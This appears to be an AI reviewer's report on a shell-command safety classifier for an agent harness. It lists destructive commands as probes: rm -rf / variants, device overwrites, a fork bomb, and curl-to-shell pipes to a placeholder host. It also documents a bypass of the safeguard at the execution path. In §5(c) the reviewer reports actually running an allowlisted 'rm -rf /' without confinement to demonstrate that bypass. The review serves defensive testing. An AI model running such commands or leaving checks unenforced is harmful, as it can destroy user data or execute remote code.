# Independent exact-diff review — S1 DANGEROUS-COMMAND-CLASSIFICATION

> Reviewer: subagent (adversarial, exact-diff)
> Model: deepseek-flash
> Builder model: deepseek-flash  ← SAME MODEL; see Independence limitation
> Worktree: `autonomous-agent-core/.worktrees/m1-danger-cmd-20260915`
> Commit under review: `a99502d5` (parent `18d7b9b0` = `origin/main`)
> Gate packet: `.agent_runs/m1-danger-cmd-20260915/goal-card-cp-ab.md`
> Scope of write: this file only; all source/test files were treated READ-ONLY.

## 0. Independence limitation (must be recorded)

Per root `AGENTS.md` §11 / §14, review requires `builder_id != reviewed_by`. **I am the
same model as the builder (deepseek-flash).** This review is therefore *not* an
independent sign-off and must not by itself satisfy the "independent exact-diff review"
gate. At minimum an independent human or a different model must confirm this verdict
before the slice is promotable.

## 1. What was reviewed / exact revision binding

`git show --stat a99502d5` and `git diff 18d7b9b0..a99502d5` were read. The commit is a
single coherent change of exactly 5 files (+296 / -1):

- `.agent_runs/m1-danger-cmd-20260915/goal-card-cp-ab.md` (new, gate packet)
- `domain_packs/developer_agent/dangerous_command.py` (new, 108 lines)
- `domain_packs/developer_agent/workspace_capability.py` (only `_preflight_shell`)
- `pyproject.toml` (adds new module to `[tool.pyright].include`)
- `tests/product/test_dangerous_command.py` (new, 31 tests)

Files read directly: `dangerous_command.py` (full), `_preflight_shell` and `_shell` and
`_execute_confined` in `workspace_capability.py`, `tests/product/test_dangerous_command.py`,
`agent_os_core/trusted_commands.py` (`TRUSTED_SHELL_PROFILE_V1`),
`agent_os_core/_action_outcome.py` (`CapabilityDenied`), and
`domain_packs/developer_agent/workspace_capability.py` (`_shell`, `_execute_confined`).

## 2. CTO gate conditions — verification result

| # | Condition | Result |
|---|---|---|
| 1 | Classifier runs BEFORE the allowlist in `_preflight_shell` | **PASS (preflight only)** — code order confirmed: `classify_dangerous_command` at L456, allowlist check at L464. |
| 2 | Every shell denial carries an enumerable `reason_code` | **PARTIAL / FAIL** — `_preflight_shell` yes; the execution-site `_shell` still raises bare `CapabilityDenied` with no `reason_code` (L1225-1226). |
| 3 | Dangerous command refused even if allowlisted (bypass-detecting RED test) | **PASS at preflight / FAIL at execution** — `test_dangerous_command_is_denied_even_when_allowlisted` passes; but the actual execution path `_shell` accepts an allowlisted `rm -rf /` (demonstrated, §4). |
| 4 | Classifier not constant and does not flag trusted profile | **PASS** — trusted profile returns `()`; the detects test would fail under `return ()`. |
| 5 | Documented as classifier, not isolation | **PASS** — module docstring + packet §1/§6. |
| 6 | New file in `[tool.pyright].include` | **PASS**. |

## 3. Would a constant `return ()` classifier pass the tests? (bypass detection)

**No — bypass is detected, but only partially.**

- `test_classifier_detects_dangerous_commands` (13 parametrised cases) asserts
  `expected in classes`; a `return ()` classifier fails all 13 → RED.
- `test_dangerous_command_is_denied_even_when_allowlisted` calls
  `adapter.preflight("workspace.shell", {"command": "rm -rf /"}, ...)` with `"rm -rf /"`
  in the allowlist; with `return ()` the allowlist check passes and no exception is
  raised → RED.
- Weak spot: `test_classifier_is_not_constant_on_benign_commands` only asserts `() == ()`
  for benign inputs, so it *passes* under a constant classifier. The name is misleading;
  real bypass detection rests on the two tests above, not on this one.
- There is **no** test that the classifier/denial is enforced on the real execution path
  (`_shell` / `execute`), so a regression that removes classification from `_preflight_shell`
  would be caught, but the absence of classification in `_shell` is not caught.

## 4. What `(d)` subtype probing showed

- `ShellCommandDenied(CapabilityDenied)` and `CapabilityDenied(PermissionError)`
  (`packages/os_core/src/agent_os_core/_action_outcome.py:15`). Existing
  `except CapabilityDenied` callers still catch it. **PASS.**
- No test/code in `tests/` uses `type(exc) is CapabilityDenied`, so the type change is
  safe. The free-text allowlist message is preserved and
  `tests/product/test_terminal_chat_loop.py:930` (`"not in the shell allowlist"`) still
  passes.
- `reason_code` here is a `ShellDenialReason` enum; `CapabilityEffectUnknown.reason_code`
  is a `str`. Different types but not a conflict — `ShellCommandDenied` is not a
  `CapabilityEffectUnknown`, so the broker's `POST_DISPATCH_UNCERTAIN` path is unaffected.
- No test asserts the subtype relation (`pytest.raises(CapabilityDenied)` on a shell
  denial); recommended but not required.

## 5. Adversarial classifier probe (author-run, results verbatim)

Method: `uv run --extra product-test python -` importing
`classify_dangerous_command`/`is_dangerous_command`. Key results:

### (a) FALSE NEGATIVES — realistic destructive commands MISSED (severity: HIGH within the stated threat model)

The packet's own threat model is "an operator who mis-allowlists a destructive command."
All of these return `()` and would therefore be **permitted if allowlisted**:

```
False ()  | '/bin/rm -rf /'
False ()  | 'busybox rm -rf /'
False ()  | 'env rm -rf /tmp/x'
False ()  | 'command rm -rf /'
False ()  | 'time rm -rf /tmp'
False ()  | "sh -c 'rm -rf /'"
False ()  | 'find . -delete'
False ()  | 'find . -exec rm -rf {} +'
False ()  | 'xargs rm -rf'
False ()  | 'git clean -fdx'
False ()  | 'git clean -fd'
False ()  | 'chmod 0777 file'
False ()  | 'chmod --recursive 777 .'
False ()  | '>> /dev/sda'
False ()  | 'cat x >> /dev/sda'
False ()  | '> /dev/sda'
False ()  | 'curl http://e/x | /bin/sh'
False ()  | 'curl http://e/x | tee /tmp/x | bash'
False ()  | 'wget -qO- http://e/x | busybox sh'
False ()  | 'f(){ f|f& };f'
False ()  | 'echo hi\nrm -rf /'
```

Root causes:
- `RECURSIVE_DELETE` requires `rm` at `^` or after `[;&|]\s*`; any prefix wrapper
  (`/bin/`, `busybox `, `env `, `command `, `time `, `find -exec `, `xargs `) or quote
  context is missed.
- Whitespace normalisation (`" ".join(command.split())`) collapses newlines, so a
  newline-separated `rm -rf /` loses its command boundary.
- No patterns at all for `find -delete`, `git clean -fdx`, device redirection
  (`>` / `>> /dev/sdX`), or non-`:` fork bombs.
- `PERMISSION_WIDENING` requires the literal `777` immediately after `chmod`+flags, so
  `chmod 0777` and `chmod --recursive 777` are missed.
- `REMOTE_CODE_EXECUTION` requires the interpreter immediately after a single `|`, so
  `/bin/sh`, multi-stage pipes (`| tee x | bash`) and `busybox sh` are missed.

Note: because the allowlist fail-closes everything else, these misses are only
exploitable when the operator allowlists the exact command string — but that is exactly
the scenario the slice claims to protect. The module docstring discloses "heuristic and
incomplete by design," yet the current test set contains **zero** negative variants, so
the observable incompleteness is much wider than the tests imply.

### (b) FALSE POSITIVES (severity: LOW) — trusted profile and `git diff --stat` are CLEAN

Verified clean: all 9 of `TRUSTED_SHELL_PROFILE_V1`, plus `git diff --stat`,
`git log -5 --oneline`, `pytest`, `python -m pytest`, `ruff check .`, `git status`,
`ls -la`, `make test`. Gate condition #4 holds.

Flagged benign/legit commands:
```
True RECURSIVE_DELETE      | 'rm -f build.log'          # -f matches the [rf] flag class; class label says "recursive"
True DEVICE_OVERWRITE      | 'dd if=disk.img of=/dev/null bs=4M'   # writes to /dev/null
True DEVICE_OVERWRITE      | 'echo of=/dev/sda'          # 2nd alternation has no dd requirement
True REMOTE_CODE_EXECUTION | 'curl http://x/p.py | python3 -'      # arguably intended
True PRIVILEGE_ESCALATION  | 'sudo --version' / 'sudo -n true'
```
The device-overwrite rule `\bof=/dev/[a-z]` is `dd`-independent, so any string
containing `of=/dev/<letter>` is flagged. Low impact (still fail-closed) but it is a
genuine misclassification.

### (c) Classifier-before-allowlist + allowlisted-dangerous refusal

- Confirmed by source order and by `test_dangerous_command_is_denied_even_when_allowlisted`.
- **BUT the execution site bypasses it.** `_shell` (`workspace_capability.py:1223-1226`)
  only checks the allowlist and raises bare `CapabilityDenied`. Demonstrated directly:

```
>>> a = DeveloperWorkspaceAdapter(tmp, shell_allowlist=("rm -rf /", "git status"))
>>> a._shell({"command": "rm -rf /", "timeout_seconds": 5}, "k")
_shell EXECUTED allowlisted dangerous command -> BYPASS
```

  The command was actually dispatched through `subprocess.run` (default
  `trusted_workspace_only` isolation, L1174-1186, no confinement). The normal broker path
  (`packages/os_core/src/agent_os_core/capability.py:177` preflight → L193 execute) does
  run preflight first, so the *default product path* is covered. The finding is that the
  claimed defense-in-depth is enforced in exactly one place, has no execution-site
  backstop, and no invariant/test prevents `execute()` being reached otherwise.

## 6. Test runs (exact)

- `uv run --extra product-test pytest tests/product/test_dangerous_command.py -q` →
  **`31 passed in 0.42s`**. Matches the packet claim.
- Adjacent suites (`test_terminal_chat_loop.py`, `test_spine0_security_and_persistence.py`,
  `test_permission_mode_matrix.py`, `test_capability_adapter_boundary.py`,
  `test_session_todo_write.py`) → **`95 passed in 5.89s`**.
- `ruff check` on the three changed files → `All checks passed!`
- `git diff --check 18d7b9b0..a99502d5` → clean.
- I did **not** re-run the full `tests/product` baseline comparison (packet claims
  24 failed == base). Not independently re-verified here.

## 7. Findings (severity-ranked)

1. **[HIGH — required]** False negatives in the stated threat model: trivial destructive
   variants are missed (`/bin|busybox|env|command|time rm -rf`, `xargs rm -rf`,
   `find . -exec rm -rf {} +`, `find . -delete`, `git clean -fdx`, `chmod 0777`,
   `> /dev/sda` / `>> /dev/sda`, `curl | /bin/sh`, `curl | tee x | bash`,
   newline-separated commands). An operator who allowlists any of these is *not* refused.
2. **[MEDIUM — required]** Execution-site gap: `_shell` (the real dispatch path) does not
   run the classifier and raises untyped `CapabilityDenied`, so gate conditions #1 ("runs
   before the allowlist" as defense-in-depth) and #2 ("every shell denial carries an
   enumerable reason_code") are only true at preflight. Either classify in `_shell` too,
   or assert/document the preflight-before-execute invariant and add a backstop test.
3. **[LOW-MEDIUM — recommended]** Test gaps: no execution-path test; the
   `test_classifier_is_not_constant_on_benign_commands` test passes under a constant
   classifier (misleading name); no negative-variant tests; no test that
   `ShellCommandDenied` is caught by `except CapabilityDenied`.
4. **[LOW]** False positives: `rm -f` mislabeled `RECURSIVE_DELETE`;
   `dd ... of=/dev/null` / `echo of=/dev/sda` flagged as `DEVICE_OVERWRITE` because the
   second alternation does not require `dd`; `sudo --version` flagged.
5. **[LOW]** Claim wording: "an allowlisted destructive command is still refused" is true
   only for the 7 pattern families and only on the preflight path. Packet §6 does disclose
   the heuristic limit, so this is a wording precision issue, not a fabrication.

## 8. Positives (fair credit)

- New module is in the domain pack, not OS Core; no C7/permit/permission change, no new
  capability/event/storage — boundary respected.
- `ShellCommandDenied` is a proper `CapabilityDenied` subtype with an enumerable
  `reason_code` and `classes`; the legacy allowlist message is preserved and still
  asserted by an existing test.
- The classifier genuinely runs before the allowlist at preflight, and the
  allowlisted-`rm -rf /` test is a real bypass detector for that path.
- Trusted profile is clean; `return ()` (constant) fails the detects test.
- `pyproject.toml` include updated; ruff clean; diff is tight and reviewable.

## 9. Required changes

1. Broaden patterns and add regression tests for the §5(a) variants (prefix/path wrappers,
   `xargs`/`find -exec rm`, `find -delete`, `git clean -fdx`, `chmod 0nnn`, device
   redirection, multi-stage interpreter pipes, newline-split commands).
2. Enforce classification at the execution site (`_shell`) or add an explicit
   preflight-required invariant plus a test that `execute()` cannot run an allowlisted
   dangerous command; make the `_shell` denial a `ShellCommandDenied` carrying
   `NOT_IN_ALLOWLIST` so gate condition #2 is literally true.
3. Tighten the `DEVICE_OVERWRITE` second alternation to require `dd` context (or a device
   path) to remove the `echo of=/dev/sda` false positive; decide whether `rm -f` belongs
   in `RECURSIVE_DELETE`.
4. Add a test asserting `pytest.raises(CapabilityDenied)` catches `ShellCommandDenied`
   (subtype compatibility), and fix/replace the misleading "not constant" test.
5. Obtain a genuinely independent review before promotion (see §0).

## 10. Verdict

**APPROVE_WITH_CHANGES**

The slice is well-scoped, honestly documented, boundary-clean, and its 31 tests pass and
include a genuine preflight bypass detector. But the classifier misses basic destructive
variants in its own stated threat model (finding #1) and is not enforced at the execution
site, leaving an untyped denial and a demonstrated `_shell` bypass (finding #2). These are
concrete required changes, not style nits. Additionally, this review lacks reviewer
independence (same model as builder), so it cannot alone satisfy the independent
exact-diff gate.
